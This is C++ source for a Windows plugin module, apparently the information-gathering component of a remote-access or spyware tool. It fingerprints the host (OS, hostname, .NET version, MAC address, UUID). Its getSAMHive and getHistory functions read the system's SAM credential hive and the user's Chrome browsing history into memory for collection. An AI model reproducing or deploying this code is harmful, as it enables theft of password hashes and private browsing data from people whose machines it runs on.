#include "InfoClient.hpp"

_I_InfoClient* getInstance() {
	_I_InfoClient *module = new InfoClient();
	return (module);
}


/////////////////////////////////////////////////////
// Get Dictionary
/////////////////////////////////////////////////////

extern "C" {
#ifdef __linux__
	Dictionary	getDictionary(void)
#elif _WIN32
	__declspec(dllexport) Dictionary	__cdecl getDictionary(void)
#endif
	{
		Dictionary	dict = new std::map<std::string, void *>;

		// List every usefull functions out there
		(*dict)["getInstance"] = (void *)&getInstance;
		return (dict);
	}
}


InfoClient::InfoClient() {
}

InfoClient::~InfoClient() {
}

std::map<_I_InfoClient::InfoType, std::string> InfoClient::routine() {
	std::map<enum _I_InfoClient::InfoType, std::string> itemlist;
	itemlist.insert(std::pair<_I_InfoClient::InfoType, std::string>(_I_InfoClient::InfoType::OSTYPE, this->getOSType()));
	itemlist.insert(std::pair<_I_InfoClient::InfoType, std::string>(_I_InfoClient::InfoType::HOSTNAME, this->getHostname()));
	itemlist.insert(std::pair<_I_InfoClient::InfoType, std::string>(_I_InfoClient::InfoType::DOTNETVER, this->getdotNETver()));
	itemlist.insert(std::pair<_I_InfoClient::InfoType, std::string>(_I_InfoClient::InfoType::MACADDR, this->getMacAddr()));
	itemlist.insert(std::pair<_I_InfoClient::InfoType, std::string>(_I_InfoClient::InfoType::UUID, this->getUUID()));
	return (itemlist);
}

std::string InfoClient::getOSType() {
	HKEY hKey;
	DWORD dwtype = REG_SZ;
	LONG lRes = RegOpenKeyExW(HKEY_LOCAL_MACHINE, OSTYPE_REG, 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
	DWORD bufferSize = 512;
	char result[512] = { 0 };
	if (lRes != 0) {
		std::cout << "lres = " << lRes << std::endl;
		return (std::string("N/A"));
	}
	LONG nError = RegQueryValueExW(hKey, OSTYPE_KEY, NULL, &dwtype, (LPBYTE)&result, &bufferSize);
	if (nError == ERROR_SUCCESS) {
		std::string end;
		for (int i = 0; i < 512; i++) {
			if (result[i] != 0) {
				end += result[i];
			}
		}
		return (std::string(end));
	}
	std::cout << "nError = " << nError << std::endl;
	return (std::string("N/A"));
}

std::string InfoClient::getHostname() {
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		return (std::string("N/A"));
	}
	char *hostname = (char*)malloc(sizeof(char) * 256);
	int ret = gethostname(hostname, 255);
	if (ret == 0) {
		return (std::string(hostname));
	}
	return std::string("N/A");
}

std::string InfoClient::getdotNETver() {
	HKEY hKey;
	LONG lRes = RegOpenKeyExW(HKEY_LOCAL_MACHINE, DOTNETVER_REG, 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
	DWORD result(0);
	DWORD bufferSize(sizeof(DWORD));
	if (lRes != 0) {
		return (std::string("N/A"));
	}
	LONG nError = RegQueryValueExW(hKey, DOTNETVER_KEY, 0, NULL, reinterpret_cast<LPBYTE>(&result), &bufferSize);
	if (nError == ERROR_SUCCESS) {
		return (std::to_string(result));
	}
	return (std::string("N/A"));
}



std::string InfoClient::getMacAddr() {
	PIP_ADAPTER_INFO adapter;
	DWORD dwBuflen = sizeof(adapter);
	char *mac_addr = (char*)malloc(sizeof(char) * 24);
	adapter = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (adapter == NULL || mac_addr == NULL) {
		return std::string("N/A");
	}
	if (GetAdaptersInfo(adapter, &dwBuflen) == ERROR_BUFFER_OVERFLOW) {
		adapter = (IP_ADAPTER_INFO *)malloc(dwBuflen);
		if (adapter == NULL) {
			return (std::string("N/A"));
		}
	}
	if (GetAdaptersInfo(adapter, &dwBuflen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = adapter;
		snprintf(mac_addr, 24, "%02X:%02X:%02X:%02X:%02X:%02X", 
			pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2],
			pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
		return (std::string(mac_addr));
	}
	return std::string("N/A");
}

std::string InfoClient::getUUID() {
	char buffer[255];
	std::string result = "";
	std::shared_ptr<FILE> pipe(_popen(GET_UUID, "r"), _pclose);
	if (!pipe)
		return (std::string("N/A"));
	int i = 1;
	while (!feof(pipe.get())) {
		if (fgets(buffer, 255, pipe.get()) != NULL) {
			if (i % 2 == 0)
				result += buffer;
			i++;
		}
	}
	return (result);
}

int	InfoClient::getSAMHive(char **output) {
	std::string path;
	std::ifstream file;
	int length;

	path = "C:/Windows/System32/config/SAM";
	file.open(path);
	if (file.is_open() == false) {
		std::cout << "This : ";
		perror("why:");
		std::cout << path << std::endl;
		return (-1);
	}
	file.seekg(0, std::ios::end);
	length = (int)file.tellg();
	file.seekg(0, std::ios::beg);
	char *buffer = (char*)malloc(sizeof(char) * length);
	file.read(buffer, length);
	*output = buffer;
	file.close();
	return (length);
}

int InfoClient::getHistory(char **output) {
	std::string path;
	std::ifstream file;
	char name[255] = { 0 };
	DWORD _nbuffer = 255;
	int length;

	path += "C:/Users/";
	if (GetUserName((LPSTR)name, &_nbuffer) == false) {
		std::cout << "No Username" << std::endl;
	}
	for (int i = 0; i < 255; i++) {
		if (name[i] != 0) {
			path += name[i];
		}
	}
	path += "/AppData/Local/Google/Chrome/User Data/Default/History";
	file.open(path);
	if (file.is_open() == false) {
		std::cout << "This : "  << path << std::endl;
		return (-1);
 	}
	file.seekg(0, std::ios::end);
	length = (int)file.tellg();
	file.seekg(0, std::ios::beg);
	char *buffer = (char*)malloc(sizeof(char) * length);
	file.read(buffer, length);
	*output = buffer;
	file.close();
	return (length);
}
